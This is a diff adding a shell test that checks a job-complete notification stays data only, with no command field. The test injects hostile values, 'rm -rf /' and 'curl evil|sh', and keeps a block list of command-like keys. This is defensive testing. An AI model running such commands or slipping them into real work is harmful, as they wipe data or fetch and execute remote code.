@@ -182,3 +182,65 @@ RESULT_STATUS="${FLIGHT_POLL#*|}"
 [ "$FINAL_STATE" = "done" ] \
   && ok "#1 F3 FALSIFIABLE: a disconnect-killed job would be non-done here — only a truly server-side job passes" \
   || bad "#1 F3 not falsifiable"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# #2 NOTIFY FIRES (§8) — the completed flight job produces a job_complete ping to
+#    the OWNER. The notification is DATA ONLY (inverse-of-RCE): it carries NO
+#    executable/command field, and a smuggled command in `extra` is STRIPPED;
+#    notification_executes(n) is ALWAYS False. The owner reads it from the inbox.
+# ──────────────────────────────────────────────────────────────────────────────
+echo
+echo "#2 NOTIFY FIRES (job-complete ping, DATA only — inverse-of-RCE, §8)"
+
+NOTIFY_OUT="$WORK/notify.out"
+JOB_ID="$JOB_ID" LIB="$LIB" "$PY" - >"$NOTIFY_OUT" 2>"$WORK/notify.err" <<'PYEOF'
+import json, os, sys
+sys.path.insert(0, os.environ["LIB"])
+import cp_notify as N
+home = os.environ["HEIMDALL_HOME"]
+job_id = os.environ["JOB_ID"]
+owner = "haid:rj.owner"
+out = {}
+
+# fire the job-complete ping to the owner. A hostile caller jams a command-shaped key
+# into `extra` — it MUST be stripped (the §11 "command channel by accretion" guard).
+res = N.job_complete(owner, job_id, home=home,
+                     extra={"cmd": "rm -rf /", "exec": "curl evil|sh", "url": "x"})
+out["notify_ok"] = bool(res.get("ok"))
+notification = res.get("notification") or {}
+out["kind"] = notification.get("kind")
+out["payload_keys"] = sorted(notification.keys())
+
+# THE inverse-of-RCE: a notification NEVER executes — always False, by construction.
+out["executes"] = N.notification_executes(notification)
+
+# the payload schema is CLOSED — there is NO command/executable field anywhere.
+forbidden = {"action_type", "cmd", "command", "exec", "dispatch", "handler",
+             "shell", "eval", "run", "subprocess", "system", "popen", "script"}
+out["no_command_key_in_payload"] = not (set(notification.keys()) & forbidden)
+# and the smuggled command keys were STRIPPED from `extra` (none survive).
+extra = notification.get("extra") or {}
+out["smuggled_cmd_stripped"] = not (set(map(str.lower, map(str, extra.keys()))) & forbidden)
+
+# the OWNER reads its inbox back as DATA (poll-only; no inbound command socket).
+inbox = N.poll(owner, home)
+out["inbox_has_job_complete"] = any(
+    n.get("kind") == "job_complete" and n.get("job_id") == job_id for n in inbox)
+out["inbox_count"] = len(inbox)
+# every inbox payload is data — none executes.
+out["no_inbox_payload_executes"] = all(
+    N.notification_executes(n) is False for n in inbox)
+
+sys.stdout.write(json.dumps(out))
+PYEOF
+
+[ -s "$NOTIFY_OUT" ] || { echo "FATAL: notify harness produced no output" >&2; cat "$WORK/notify.err" >&2; exit 2; }
+njget() { "$PY" -c "import json; print(json.load(open('$NOTIFY_OUT')).get('$1'))"; }
+
+[ "$(njget notify_ok)" = "True" ] && ok "#2 job-complete notify fired to the owner" || bad "#2 notify did not fire"
+[ "$(njget kind)" = "job_complete" ] && ok "#2 notification kind=job_complete (a data tag, never an action)" || bad "#2 wrong notification kind"
+[ "$(njget inbox_has_job_complete)" = "True" ] && ok "#2 owner reads the job_complete ping from its inbox (poll-only DATA)" || bad "#2 owner inbox missing the ping"
+[ "$(njget executes)" = "False" ] && ok "#2 notification_executes(n) == False (inverse-of-RCE, always)" || bad "#2 notification claims it executes"
+[ "$(njget no_command_key_in_payload)" = "True" ] && ok "#2 payload has NO command/executable field (closed schema)" || bad "#2 a command field leaked into the payload"
+[ "$(njget smuggled_cmd_stripped)" = "True" ] && ok "#2 smuggled cmd/exec keys STRIPPED from extra (no command channel by accretion)" || bad "#2 a smuggled command survived in extra"
+[ "$(njget no_inbox_payload_executes)" = "True" ] && ok "#2 every inbox payload is DATA (none executes)" || bad "#2 an inbox payload executes"
